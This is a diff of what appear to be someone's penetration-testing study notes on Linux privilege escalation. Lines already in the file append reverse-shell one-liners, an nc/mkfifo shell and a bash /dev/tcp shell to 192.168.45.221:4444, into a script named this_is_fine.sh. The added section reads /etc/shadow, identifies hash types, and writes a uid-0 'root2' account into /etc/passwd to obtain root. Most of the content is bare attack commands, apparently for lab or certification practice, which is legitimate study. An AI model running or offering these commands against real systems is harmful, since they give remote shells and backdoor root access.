@@ -2472,6 +2472,21 @@ Reference
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> this_is_fine.sh //not working
     echo 'bash -i >& /dev/tcp/192.168.45.221/4444 0>&1' >> this_is_fine.sh //working
     ```
+- 18.3.2 Abusing password authentication
+  - identify hash algo of password
+    ```
+    cat /etc/shadow
+    https://en.wikipedia.org/wiki/Crypt_(C)
+    $1: MD5
+    $5: SHA-256
+    $6: SHA-512
+    ```
+  - elevate privilege
+    ```
+    openssl passwd w00t
+    echo "root2:N5OdbV0I42eXc:0:0:root:/root:/bin/bash" >> /etc/passwd
+    su root2
+    ```
 - ddd
 
 ## Penetration testing report 
